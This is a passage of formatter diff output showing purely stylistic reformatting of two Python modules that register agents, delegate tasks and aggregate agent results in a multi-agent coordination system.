                 # Initialize result list for the task
                 if task_id not in self.results:
                     self.results[task_id] = []
-                
+
                 # Set aggregation strategy
                 self.strategies[task_id] = strategy
-                
+
                 # Set custom aggregator if provided
                 if strategy == AggregationStrategy.CUSTOM:
                     if custom_aggregator is None:
                         raise CoordinationError(
                             "Custom aggregator function must be provided for CUSTOM strategy",
-                            task_id=task_id
+                            task_id=task_id,
                         )
                     self.custom_aggregators[task_id] = custom_aggregator
-                
+
                 self.logger.info(
                     f"Task registered for aggregation: {task_id} with strategy {strategy.value}"
                 )
-                
+
                 return True
         except CoordinationError:
             # Re-raise coordination errors
             raise
         except Exception as e:
             error_msg = f"Failed to register task {task_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, task_id=task_id, cause=e)
-    
+
     async def add_result(
-        self,
-        task_id: str,
-        agent_id: str,
-        result: Any,
-        metadata: Dict[str, Any] = None
+        self, task_id: str, agent_id: str, result: Any, metadata: Dict[str, Any] = None
     ) -> bool:
         """
         Add a result for a task.
-        
+
         Args:
             task_id: ID of the task
             agent_id: ID of the agent that produced the result
             result: The result data
             metadata: Additional metadata for the result
-            
+
         Returns:
             True if the result was added successfully
-            
+
         Raises:
             CoordinationError: If adding the result fails
         """
         try:
             async with self.result_lock:
                 # Initialize result list for the task if needed
                 if task_id not in self.results:
                     self.results[task_id] = []
-                
+
                 # Create result entry
                 result_entry = {
                     "agent_id": agent_id,
                     "result": result,
                     "timestamp": datetime.now(),
-                    "metadata": metadata or {}
+                    "metadata": metadata or {},
                 }
-                
+
                 # Add result to the list
                 self.results[task_id].append(result_entry)
-                
+
                 self.logger.info(
                     f"Result added for task {task_id} from agent {agent_id}"
                 )
-                
+
                 # Publish result added event
                 await self._publish_result_added_event(task_id, agent_id, result)
-                
+
                 return True
         except Exception as e:
             error_msg = f"Failed to add result for task {task_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, task_id=task_id, cause=e)
-    
+
     async def get_results(self, task_id: str) -> List[Dict[str, Any]]:
         """
         Get all results for a task.
-        
-        Args:
-            task_id: ID of the task
-            
+
+        Args:
+            task_id: ID of the task
+
         Returns:
             List of result entries
-            
+
         Raises:
             CoordinationError: If getting the results fails
         """
         try:
             async with self.result_lock:
                 return self.results.get(task_id, [])
         except Exception as e:
             error_msg = f"Failed to get results for task {task_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, task_id=task_id, cause=e)
-    
+
     async def aggregate_results(self, task_id: str) -> Any:
         """
         Aggregate results for a task.
-        
-        Args:
-            task_id: ID of the task
-            
+
+        Args:
+            task_id: ID of the task
+
         Returns:
             Aggregated result
-            
+
         Raises:
             CoordinationError: If aggregation fails
         """
         try:
             # Get all results for the task
             results = await self.get_results(task_id)
-            
+
             if not results:
                 self.logger.warning(f"No results to aggregate for task {task_id}")
                 return None
-            
+
             # Get aggregation strategy
             strategy = self.strategies.get(task_id, AggregationStrategy.COLLECT)
-            
+
             # Aggregate results based on strategy
             if strategy == AggregationStrategy.COLLECT:
                 # Simply collect all results
                 aggregated_result = {
-                    result["agent_id"]: result["result"]
-                    for result in results
+                    result["agent_id"]: result["result"] for result in results
                 }
             elif strategy == AggregationStrategy.MAJORITY:
                 # Use the majority result
                 # This assumes results are comparable
                 result_counts = {}
                 for result_entry in results:
-                    result_value = str(result_entry["result"])  # Convert to string for counting
+                    result_value = str(
+                        result_entry["result"]
+                    )  # Convert to string for counting
                     if result_value not in result_counts:
                         result_counts[result_value] = 0
                     result_counts[result_value] += 1
-                
+
                 # Find the majority result
                 majority_result = max(result_counts.items(), key=lambda x: x[1])[0]
                 aggregated_result = majority_result
             elif strategy == AggregationStrategy.WEIGHTED:
                 # Weight results by source
                 # This assumes results are numeric and weights are in metadata
                 weighted_sum = 0
                 total_weight = 0
-                
+
                 for result_entry in results:
                     weight = result_entry["metadata"].get("weight", 1.0)
                     weighted_sum += result_entry["result"] * weight
                     total_weight += weight
-                
+
                 if total_weight > 0:
                     aggregated_result = weighted_sum / total_weight
                 else:
                     aggregated_result = None
             elif strategy == AggregationStrategy.FIRST:
@@ -298,191 +312,194 @@
                 custom_aggregator = self.custom_aggregators.get(task_id)
                 if custom_aggregator:
                     aggregated_result = custom_aggregator(results)
                 else:
                     raise CoordinationError(
-                        "Custom aggregator function not found for task",
-                        task_id=task_id
+                        "Custom aggregator function not found for task", task_id=task_id
                     )
             else:
                 raise CoordinationError(
-                    f"Unknown aggregation strategy: {strategy}",
-                    task_id=task_id
+                    f"Unknown aggregation strategy: {strategy}", task_id=task_id
                 )
-            
+
             self.logger.info(
                 f"Results aggregated for task {task_id} using strategy {strategy.value}"
             )
-            
+
             # Publish result aggregated event
-            await self._publish_result_aggregated_event(task_id, aggregated_result, strategy)
-            
+            await self._publish_result_aggregated_event(
+                task_id, aggregated_result, strategy
+            )
+
             return aggregated_result
         except CoordinationError:
             # Re-raise coordination errors
             raise
         except Exception as e:
             error_msg = f"Failed to aggregate results for task {task_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, task_id=task_id, cause=e)
-    
+
     async def clear_results(self, task_id: str) -> bool:
         """
         Clear all results for a task.
-        
-        Args:
-            task_id: ID of the task
-            
+
+        Args:
+            task_id: ID of the task
+
         Returns:
             True if the results were cleared successfully
-            
+
         Raises:
             CoordinationError: If clearing the results fails
         """
         try:
             async with self.result_lock:
                 if task_id in self.results:
                     del self.results[task_id]
-                
+
                 if task_id in self.strategies:
                     del self.strategies[task_id]
-                
+
                 if task_id in self.custom_aggregators:
                     del self.custom_aggregators[task_id]
-                
+
                 self.logger.info(f"Results cleared for task {task_id}")
-                
+
                 return True
         except Exception as e:
             error_msg = f"Failed to clear results for task {task_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, task_id=task_id, cause=e)
-    
+
     async def _subscribe_to_events(self) -> None:
         """
         Subscribe to result-related events.
-        
+
         This method sets up subscriptions for result events.
         """
         # Subscribe to task result events
         subscription_id = await self.subscriber.subscribe(
             filter=EventNameFilter(event_names={"task_result"}),
-            handler=self._handle_task_result
+            handler=self._handle_task_result,
         )
         self.subscription_ids.append(subscription_id)
-        
+
         # Subscribe to task completed events
         subscription_id = await self.subscriber.subscribe(
             filter=EventNameFilter(event_names={"task_completed"}),
-            handler=self._handle_task_completed
+            handler=self._handle_task_completed,
         )
         self.subscription_ids.append(subscription_id)
-    
+
     async def _handle_task_result(self, event: Event) -> None:
         """
         Handle a task result event.
-        
+
         Args:
             event: The result event
         """
         try:
             # Extract task ID, agent ID, and result from the event
             task_id = event.data.get("task_id")
             agent_id = event.data.get("agent_id")
             result = event.data.get("result")
             metadata = event.data.get("metadata")
-            
+
             if not task_id or not agent_id:
                 self.logger.warning("Received task result event with missing data")
                 return
-            
+
             # Add the result
             await self.add_result(task_id, agent_id, result, metadata)
         except Exception as e:
             self.logger.error(f"Error handling task result: {str(e)}", exc_info=True)
-    
+
     async def _handle_task_completed(self, event: Event) -> None:
         """
         Handle a task completed event.
-        
+
         Args:
             event: The completion event
         """
         try:
             # Extract task ID from the event
             task_id = event.data.get("task_id")
-            
+
             if not task_id:
                 self.logger.warning("Received task completed event without task_id")
                 return
-            
+
             # Check if we have results for this task
             results = await self.get_results(task_id)
             if not results:
                 self.logger.warning(f"No results found for completed task {task_id}")
                 return
-            
+
             # Aggregate the results
             aggregated_result = await self.aggregate_results(task_id)
-            
+
             # Publish the aggregated result
             await self._publish_final_result_event(task_id, aggregated_result)
         except Exception as e:
-            self.logger.error(f"Error handling task completion: {str(e)}", exc_info=True)
-    
-    async def _publish_result_added_event(self, task_id: str, agent_id: str, result: Any) -> None:
+            self.logger.error(
+                f"Error handling task completion: {str(e)}", exc_info=True
+            )
+
+    async def _publish_result_added_event(
+        self, task_id: str, agent_id: str, result: Any
+    ) -> None:
         """
         Publish a result added event.
-        
+
         Args:
             task_id: ID of the task
             agent_id: ID of the agent that produced the result
             result: The result data
         """
         await self.publisher.publish_notification(
             notification_name="result_added",
             data={
                 "task_id": task_id,
                 "agent_id": agent_id,
-                "timestamp": datetime.now().isoformat()
-            }
-        )
-    
+                "timestamp": datetime.now().isoformat(),
+            },
+        )
+
     async def _publish_result_aggregated_event(
-        self,
-        task_id: str,
-        aggregated_result: Any,
-        strategy: AggregationStrategy
+        self, task_id: str, aggregated_result: Any, strategy: AggregationStrategy
     ) -> None:
         """
         Publish a result aggregated event.
-        
+
         Args:
             task_id: ID of the task
             aggregated_result: The aggregated result
             strategy: The aggregation strategy used
         """
         await self.publisher.publish_notification(
             notification_name="result_aggregated",
             data={
                 "task_id": task_id,
                 "strategy": strategy.value,
-                "timestamp": datetime.now().isoformat()
-            }
-        )
-    
-    async def _publish_final_result_event(self, task_id: str, final_result: Any) -> None:
+                "timestamp": datetime.now().isoformat(),
+            },
+        )
+
+    async def _publish_final_result_event(
+        self, task_id: str, final_result: Any
+    ) -> None:
         """
         Publish a final result event.
-        
+
         Args:
             task_id: ID of the task
             final_result: The final aggregated result
         """
         await self.publisher.publish_notification(
             notification_name="final_result",
             data={
                 "task_id": task_id,
                 "result": final_result,
-                "timestamp": datetime.now().isoformat()
-            }
-        )
+                "timestamp": datetime.now().isoformat(),
+            },
+        )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/coordinator/result_aggregator.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/coordinator/base_coordinator.py	2025-06-14 20:35:30.783724+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/coordinator/base_coordinator.py	2025-06-19 04:03:50.518259+00:00
@@ -11,439 +11,463 @@
 from datetime import datetime, timedelta
 from typing import Any, Dict, List, Optional, Set, Tuple, Type, Union
 
 from fs_agt_clean.core.monitoring import get_logger
 from fs_agt_clean.core.coordination.event_system import (
-    Event, EventType, EventPriority, create_publisher, create_subscriber,
-    EventTypeFilter, EventNameFilter, CompositeFilter
+    Event,
+    EventType,
+    EventPriority,
+    create_publisher,
+    create_subscriber,
+    EventTypeFilter,
+    EventNameFilter,
+    CompositeFilter,
 )
 from fs_agt_clean.core.coordination.coordinator.coordinator import (
-    Coordinator, AgentInfo, AgentStatus, AgentType, AgentCapability, CoordinationError
+    Coordinator,
+    AgentInfo,
+    AgentStatus,
+    AgentType,
+    AgentCapability,
+    CoordinationError,
 )
 
 
 class BaseCoordinator(Coordinator):
     """
     Base implementation of the Coordinator interface.
-    
+
     This class provides common functionality for agent registration,
     discovery, and task delegation. It is designed to be extended by
     specific coordinator implementations.
     """
-    
+
     def __init__(self, coordinator_id: str):
         """
         Initialize the base coordinator.
-        
+
         Args:
             coordinator_id: Unique identifier for this coordinator
         """
         self.coordinator_id = coordinator_id
         self.logger = get_logger(f"coordinator.{coordinator_id}")
-        
+
         # Create publisher and subscriber for event-based communication
         self.publisher = create_publisher(source_id=f"coordinator.{coordinator_id}")
-        self.subscriber = create_subscriber(subscriber_id=f"coordinator.{coordinator_id}")
-        
+        self.subscriber = create_subscriber(
+            subscriber_id=f"coordinator.{coordinator_id}"
+        )
+
         # Initialize agent registry
         self.agents: Dict[str, AgentInfo] = {}
-        
+
         # Initialize task registry
         self.tasks: Dict[str, Dict[str, Any]] = {}
-        
+
         # Initialize conflict registry
         self.conflicts: Dict[str, Dict[str, Any]] = {}
-        
+
         # Initialize locks for thread safety
         self.agent_lock = asyncio.Lock()
         self.task_lock = asyncio.Lock()
         self.conflict_lock = asyncio.Lock()
-    
+
     async def register_agent(self, agent_info: AgentInfo) -> bool:
         """
         Register an agent with the coordinator.
-        
+
         Args:
             agent_info: Information about the agent
-            
+
         Returns:
             True if registration was successful
-            
+
         Raises:
             CoordinationError: If registration fails
         """
         try:
             async with self.agent_lock:
                 # Update status and last seen
                 agent_info.update_status(AgentStatus.ACTIVE)
-                
+
                 # Store agent info
                 self.agents[agent_info.agent_id] = agent_info
-                
+
                 self.logger.info(
                     f"Agent registered: {agent_info.agent_id} ({agent_info.name})"
                 )
-                
+
                 # Publish agent registration event
                 await self._publish_agent_registration_event(agent_info)
-                
+
                 return True
         except Exception as e:
             error_msg = f"Failed to register agent {agent_info.agent_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, agent_id=agent_info.agent_id, cause=e)
-    
+
     async def unregister_agent(self, agent_id: str) -> bool:
         """
         Unregister an agent from the coordinator.
-        
+
         Args:
             agent_id: ID of the agent to unregister
-            
+
         Returns:
             True if unregistration was successful
-            
+
         Raises:
             CoordinationError: If unregistration fails
         """
         try:
             async with self.agent_lock:
                 if agent_id not in self.agents:
-                    self.logger.warning(f"Agent not found for unregistration: {agent_id}")
-                    return False
-                
+                    self.logger.warning(
+                        f"Agent not found for unregistration: {agent_id}"
+                    )
+                    return False
+
                 # Get agent info before removal
                 agent_info = self.agents[agent_id]
-                
+
                 # Remove agent
                 del self.agents[agent_id]
-                
+
                 self.logger.info(f"Agent unregistered: {agent_id}")
-                
+
                 # Publish agent unregistration event
                 await self._publish_agent_unregistration_event(agent_info)
-                
+
                 return True
         except Exception as e:
             error_msg = f"Failed to unregister agent {agent_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, agent_id=agent_id, cause=e)
-    
+
     async def update_agent_status(self, agent_id: str, status: AgentStatus) -> bool:
         """
         Update an agent's status.
-        
+
         Args:
             agent_id: ID of the agent
             status: New status of the agent
-            
+
         Returns:
             True if the update was successful
-            
+
         Raises:
             CoordinationError: If the update fails
         """
         try:
             async with self.agent_lock:
                 if agent_id not in self.agents:
-                    self.logger.warning(f"Agent not found for status update: {agent_id}")
-                    return False
-                
+                    self.logger.warning(
+                        f"Agent not found for status update: {agent_id}"
+                    )
+                    return False
+
                 # Update status
                 old_status = self.agents[agent_id].status
                 self.agents[agent_id].update_status(status)
-                
+
                 self.logger.info(
                     f"Agent status updated: {agent_id} {old_status.value} -> {status.value}"
                 )
-                
+
                 # Publish agent status update event
                 await self._publish_agent_status_event(self.agents[agent_id])
-                
+
                 return True
         except Exception as e:
             error_msg = f"Failed to update agent status {agent_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, agent_id=agent_id, cause=e)
-    
+
     async def update_agent_capabilities(
-        self,
-        agent_id: str,
-        capabilities: List[AgentCapability]
+        self, agent_id: str, capabilities: List[AgentCapability]
     ) -> bool:
         """
         Update an agent's capabilities.
-        
+
         Args:
             agent_id: ID of the agent
             capabilities: New capabilities of the agent
-            
+
         Returns:
             True if the update was successful
-            
+
         Raises:
             CoordinationError: If the update fails
         """
         try:
             async with self.agent_lock:
                 if agent_id not in self.agents:
-                    self.logger.warning(f"Agent not found for capability update: {agent_id}")
-                    return False
-                
+                    self.logger.warning(
+                        f"Agent not found for capability update: {agent_id}"
+                    )
+                    return False
+
                 # Update capabilities
                 self.agents[agent_id].capabilities = capabilities
                 self.agents[agent_id].update_last_seen()
-                
+
                 self.logger.info(
                     f"Agent capabilities updated: {agent_id} ({len(capabilities)} capabilities)"
                 )
-                
+
                 # Publish agent capability update event
                 await self._publish_agent_capability_event(self.agents[agent_id])
-                
+
                 return True
         except Exception as e:
             error_msg = f"Failed to update agent capabilities {agent_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, agent_id=agent_id, cause=e)
-    
+
     async def get_agent_info(self, agent_id: str) -> Optional[AgentInfo]:
         """
         Get information about an agent.
-        
+
         Args:
             agent_id: ID of the agent
-            
+
         Returns:
             Agent information, or None if not found
-            
+
         Raises:
             CoordinationError: If the retrieval fails
         """
         try:
             async with self.agent_lock:
                 return self.agents.get(agent_id)
         except Exception as e:
             error_msg = f"Failed to get agent info {agent_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, agent_id=agent_id, cause=e)
-    
+
     async def find_agents_by_type(self, agent_type: AgentType) -> List[AgentInfo]:
         """
         Find agents by type.
-        
+
         Args:
             agent_type: Type of agents to find
-            
+
         Returns:
             List of matching agents
-            
+
         Raises:
             CoordinationError: If the search fails
         """
         try:
             async with self.agent_lock:
                 return [
-                    agent for agent in self.agents.values()
+                    agent
+                    for agent in self.agents.values()
                     if agent.agent_type == agent_type
                 ]
         except Exception as e:
             error_msg = f"Failed to find agents by type {agent_type.value}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, cause=e)
-    
-    async def find_agents_by_capability(self, capability: AgentCapability) -> List[AgentInfo]:
+
+    async def find_agents_by_capability(
+        self, capability: AgentCapability
+    ) -> List[AgentInfo]:
         """
         Find agents by capability.
-        
+
         Args:
             capability: Capability to search for
-            
+
         Returns:
             List of agents with the capability
-            
+
         Raises:
             CoordinationError: If the search fails
         """
         try:
             async with self.agent_lock:
                 return [
-                    agent for agent in self.agents.values()
+                    agent
+                    for agent in self.agents.values()
                     if agent.has_capability(capability)
                 ]
         except Exception as e:
-            error_msg = f"Failed to find agents by capability {capability.name}: {str(e)}"
+            error_msg = (
+                f"Failed to find agents by capability {capability.name}: {str(e)}"
+            )
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, cause=e)
-    
+
     async def find_agents_by_status(self, status: AgentStatus) -> List[AgentInfo]:
         """
         Find agents by status.
-        
+
         Args:
             status: Status to search for
-            
+
         Returns:
             List of agents with the status
-            
+
         Raises:
             CoordinationError: If the search fails
         """
         try:
             async with self.agent_lock:
                 return [
-                    agent for agent in self.agents.values()
-                    if agent.status == status
+                    agent for agent in self.agents.values() if agent.status == status
                 ]
         except Exception as e:
             error_msg = f"Failed to find agents by status {status.value}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, cause=e)
-    
+
     async def get_all_agents(self) -> List[AgentInfo]:
         """
         Get all registered agents.
-        
+
         Returns:
             List of all agents
-            
+
         Raises:
             CoordinationError: If the retrieval fails
         """
         try:
             async with self.agent_lock:
                 return list(self.agents.values())
         except Exception as e:
             error_msg = f"Failed to get all agents: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, cause=e)
-    
+
     async def check_agent_health(self, agent_id: str) -> bool:
         """
         Check if an agent is healthy.
-        
+
         Args:
             agent_id: ID of the agent
-            
+
         Returns:
             True if the agent is healthy
-            
+
         Raises:
             CoordinationError: If the health check fails
         """
         try:
             async with self.agent_lock:
                 if agent_id not in self.agents:
                     return False
-                
+
                 agent = self.agents[agent_id]
-                
+
                 # Check if the agent is active
                 if not agent.is_active():
                     return False
-                
+
                 # Check if the agent has been seen recently
                 if agent.last_seen is None:
                     return False
-                
+
                 # Consider an agent unhealthy if not seen in the last 5 minutes
                 max_age = timedelta(minutes=5)
                 if datetime.now() - agent.last_seen > max_age:
                     return False
-                
+
                 return True
         except Exception as e:
             error_msg = f"Failed to check agent health {agent_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, agent_id=agent_id, cause=e)
-    
+
     async def delegate_task(
         self,
         task_id: str,
         task_type: str,
         parameters: Dict[str, Any],
         target_agent_id: Optional[str] = None,
         required_capability: Optional[AgentCapability] = None,
         priority: int = 0,
-        deadline: Optional[datetime] = None
+        deadline: Optional[datetime] = None,
     ) -> str:
         """
         Delegate a task to an agent.
-        
+
         This base implementation handles task creation and assignment.
         Subclasses should override this method to implement specific
         delegation strategies.
-        
+
         Args:
             task_id: ID of the task
             task_type: Type of the task
             parameters: Task parameters
             target_agent_id: ID of the target agent, or None to auto-select
             required_capability: Required capability for the task
             priority: Priority of the task (higher values = higher priority)
             deadline: Deadline for task completion
-            
+
         Returns:
             ID of the assigned task
-            
+
         Raises:
             CoordinationError: If delegation fails
         """
         try:
             # If no task_id is provided, generate one
             if not task_id:
                 task_id = str(uuid.uuid4())
-            
+
             # If a target agent is specified, verify it exists and is healthy
             if target_agent_id:
                 agent_info = await self.get_agent_info(target_agent_id)
                 if not agent_info:
                     raise CoordinationError(
-                        f"Target agent not found: {target_agent_id}",
-                        task_id=task_id
-                    )
-                
+                        f"Target agent not found: {target_agent_id}", task_id=task_id
+                    )
+
                 if not await self.check_agent_health(target_agent_id):
                     raise CoordinationError(
                         f"Target agent is not healthy: {target_agent_id}",
-                        task_id=task_id
-                    )
-                
+                        task_id=task_id,
+                    )
+
                 # If a capability is required, verify the agent has it
-                if required_capability and not agent_info.has_capability(required_capability):
+                if required_capability and not agent_info.has_capability(
+                    required_capability
+                ):
                     raise CoordinationError(
                         f"Target agent does not have required capability: {required_capability.name}",
                         agent_id=target_agent_id,
-                        task_id=task_id
-                    )
-            
+                        task_id=task_id,
+                    )
+
             # If no target agent is specified but a capability is required,
             # find a suitable agent
             elif required_capability:
                 agents = await self.find_agents_by_capability(required_capability)
                 healthy_agents = [
-                    agent for agent in agents
+                    agent
+                    for agent in agents
                     if await self.check_agent_health(agent.agent_id)
                 ]
-                
+
                 if not healthy_agents:
                     raise CoordinationError(
                         f"No healthy agents found with required capability: {required_capability.name}",
-                        task_id=task_id
-                    )
-                
+                        task_id=task_id,
+                    )
+
                 # Select the agent with the fewest tasks
                 # This is a simple load balancing strategy
                 # Subclasses may implement more sophisticated strategies
                 target_agent_id = await self._select_agent_for_task(healthy_agents)
-            
+
             else:
                 raise CoordinationError(
                     "Either target_agent_id or required_capability must be specified",
-                    task_id=task_id
+                    task_id=task_id,
                 )
-            
+
             # Create the task
             task = {
                 "task_id": task_id,
                 "task_type": task_type,
                 "parameters": parameters,
@@ -451,393 +475,396 @@
                 "status": "assigned",
                 "priority": priority,
                 "created_at": datetime.now(),
                 "deadline": deadline,
                 "result": None,
-                "error": None
+                "error": None,
             }
-            
+
             # Store the task
             async with self.task_lock:
                 self.tasks[task_id] = task
-            
+
             # Publish task assignment event
             await self._publish_task_assignment_event(task)
-            
+
             self.logger.info(
                 f"Task delegated: {task_id} ({task_type}) to agent {target_agent_id}"
             )
-            
+
             return task_id
         except CoordinationError:
             # Re-raise coordination errors
             raise
         except Exception as e:
             error_msg = f"Failed to delegate task {task_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, task_id=task_id, cause=e)
-    
+
     async def get_task_status(self, task_id: str) -> Dict[str, Any]:
         """
         Get the status of a task.
-        
+
         Args:
             task_id: ID of the task
-            
+
         Returns:
             Task status information
-            
+
         Raises:
             CoordinationError: If the retrieval fails
         """
         try:
             async with self.task_lock:
                 if task_id not in self.tasks:
                     raise CoordinationError(
-                        f"Task not found: {task_id}",
-                        task_id=task_id
-                    )
-                
+                        f"Task not found: {task_id}", task_id=task_id
+                    )
+
                 task = self.tasks[task_id]
-                
+
                 # Return a copy of the task status
                 return {
                     "task_id": task["task_id"],
                     "task_type": task["task_type"],
                     "agent_id": task["agent_id"],
                     "status": task["status"],
                     "created_at": task["created_at"],
                     "deadline": task["deadline"],
-                    "priority": task["priority"]
+                    "priority": task["priority"],
                 }
         except CoordinationError:
             # Re-raise coordination errors
             raise
         except Exception as e:
             error_msg = f"Failed to get task status {task_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, task_id=task_id, cause=e)
-    
+
     async def cancel_task(self, task_id: str) -> bool:
         """
         Cancel a task.
-        
+
         Args:
             task_id: ID of the task
-            
+
         Returns:
             True if cancellation was successful
-            
+
         Raises:
             CoordinationError: If cancellation fails
         """
         try:
             async with self.task_lock:
                 if task_id not in self.tasks:
                     self.logger.warning(f"Task not found for cancellation: {task_id}")
                     return False
-                
+
                 task = self.tasks[task_id]
-                
+
                 # Only cancel tasks that are not completed or failed
                 if task["status"] in ("completed", "failed"):
                     self.logger.warning(
                         f"Cannot cancel task {task_id} with status {task['status']}"
                     )
                     return False
-                
+
                 # Update task status
                 task["status"] = "cancelled"
-                
+
                 # Publish task cancellation event
                 await self._publish_task_cancellation_event(task)
-                
+
                 self.logger.info(f"Task cancelled: {task_id}")
-                
+
                 return True
         except Exception as e:
             error_msg = f"Failed to cancel task {task_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, task_id=task_id, cause=e)
-    
+
     async def get_task_result(self, task_id: str) -> Dict[str, Any]:
         """
         Get the result of a completed task.
-        
+
         Args:
             task_id: ID of the task
-            
+
         Returns:
             Task result
-            
+
         Raises:
             CoordinationError: If the retrieval fails
         """
         try:
             async with self.task_lock:
                 if task_id not in self.tasks:
                     raise CoordinationError(
-                        f"Task not found: {task_id}",
-                        task_id=task_id
-                    )
-                
+                        f"Task not found: {task_id}", task_id=task_id
+                    )
+
                 task = self.tasks[task_id]
-                
+
                 if task["status"] != "completed":
                     raise CoordinationError(
                         f"Task not completed: {task_id} (status: {task['status']})",
-                        task_id=task_id
-                    )
-                
+                        task_id=task_id,
+                    )
+
                 # Return a copy of the task result
                 return {
                     "task_id": task["task_id"],
                     "task_type": task["task_type"],
                     "agent_id": task["agent_id"],
                     "result": task["result"],
-                    "completed_at": task.get("completed_at")
+                    "completed_at": task.get("completed_at"),
                 }
         except CoordinationError:
             # Re-raise coordination errors
             raise
         except Exception as e:
             error_msg = f"Failed to get task result {task_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, task_id=task_id, cause=e)
-    
+
     async def get_agent_tasks(self, agent_id: str) -> List[Dict[str, Any]]:
         """
         Get tasks assigned to an agent.
-        
+
         Args:
             agent_id: ID of the agent
-            
+
         Returns:
             List of tasks assigned to the agent
-            
+
         Raises:
             CoordinationError: If the retrieval fails
         """
         try:
             async with self.task_lock:
                 # Find all tasks assigned to the agent
                 agent_tasks = [
-                    task for task in self.tasks.values()
-                    if task["agent_id"] == agent_id
+                    task for task in self.tasks.values() if task["agent_id"] == agent_id
                 ]
-                
+
                 # Return copies of the tasks
                 return [
                     {
                         "task_id": task["task_id"],
                         "task_type": task["task_type"],
                         "status": task["status"],
                         "created_at": task["created_at"],
                         "deadline": task["deadline"],
-                        "priority": task["priority"]
+                        "priority": task["priority"],
                     }
                     for task in agent_tasks
                 ]
         except Exception as e:
             error_msg = f"Failed to get agent tasks {agent_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, agent_id=agent_id, cause=e)
-    
+
     async def resolve_conflict(
         self,
         conflict_id: str,
         resolution_strategy: str,
-        resolution_parameters: Dict[str, Any]
+        resolution_parameters: Dict[str, Any],
     ) -> bool:
         """
         Resolve a conflict between agents or tasks.
-        
+
         This base implementation provides a framework for conflict resolution.
         Subclasses should override this method to implement specific
         resolution strategies.
-        
+
         Args:
             conflict_id: ID of the conflict
             resolution_strategy: Strategy to use for resolution
             resolution_parameters: Parameters for the resolution strategy
-            
+
         Returns:
             True if resolution was successful
-            
+
         Raises:
             CoordinationError: If resolution fails
         """
         try:
             async with self.conflict_lock:
                 if conflict_id not in self.conflicts:
-                    self.logger.warning(f"Conflict not found for resolution: {conflict_id}")
-                    return False
-                
+                    self.logger.warning(
+                        f"Conflict not found for resolution: {conflict_id}"
+                    )
+                    return False
+
                 conflict = self.conflicts[conflict_id]
-                
+
                 # Only resolve active conflicts
                 if conflict["status"] != "active":
                     self.logger.warning(
                         f"Cannot resolve conflict {conflict_id} with status {conflict['status']}"
                     )
                     return False
-                
+
                 # Update conflict status
                 conflict["status"] = "resolved"
                 conflict["resolution_strategy"] = resolution_strategy
                 conflict["resolution_parameters"] = resolution_parameters
                 conflict["resolved_at"] = datetime.now()
-                
+
                 # Publish conflict resolution event
                 await self._publish_conflict_resolution_event(conflict)
-                
+
                 self.logger.info(
                     f"Conflict resolved: {conflict_id} using strategy {resolution_strategy}"
                 )
-                
+
                 return True
         except Exception as e:
             error_msg = f"Failed to resolve conflict {conflict_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, cause=e)
-    
+
     async def _select_agent_for_task(self, agents: List[AgentInfo]) -> str:
         """
         Select an agent for a task from a list of candidates.
-        
+
         This base implementation uses a simple load balancing strategy.
         Subclasses may override this method to implement more sophisticated
         selection strategies.
-        
+
         Args:
             agents: List of candidate agents
-            
+
         Returns:
             ID of the selected agent
         """
         # If there's only one agent, select it
         if len(agents) == 1:
             return agents[0].agent_id
-        
+
         # Get the number of tasks for each agent
         agent_task_counts = {}
         for agent in agents:
             tasks = await self.get_agent_tasks(agent.agent_id)
-            active_tasks = [task for task in tasks if task["status"] in ("assigned", "processing")]
+            active_tasks = [
+                task for task in tasks if task["status"] in ("assigned", "processing")
+            ]
             agent_task_counts[agent.agent_id] = len(active_tasks)
-        
+
         # Select the agent with the fewest active tasks
         return min(agent_task_counts.items(), key=lambda x: x[1])[0]
-    
+
     async def _publish_agent_registration_event(self, agent_info: AgentInfo) -> None:
         """
         Publish an agent registration event.
-        
+
         Args:
             agent_info: Information about the registered agent
         """
         await self.publisher.publish_notification(
             notification_name="agent_registered",
             data={
                 "agent_id": agent_info.agent_id,
                 "agent_type": agent_info.agent_type.value,
                 "name": agent_info.name,
-                "capabilities": [cap.to_dict() for cap in agent_info.capabilities]
-            }
+                "capabilities": [cap.to_dict() for cap in agent_info.capabilities],
+            },
         )
-    
+
     async def _publish_agent_unregistration_event(self, agent_info: AgentInfo) -> None:
         """
         Publish an agent unregistration event.
-        
+
         Args:
             agent_info: Information about the unregistered agent
         """
         await self.publisher.publish_notification(
             notification_name="agent_unregistered",
             data={
                 "agent_id": agent_info.agent_id,
                 "agent_type": agent_info.agent_type.value,
-                "name": agent_info.name
-            }
+                "name": agent_info.name,
+            },
         )
-    
+
     async def _publish_agent_status_event(self, agent_info: AgentInfo) -> None:
         """
         Publish an agent status update event.
-        
+
         Args:
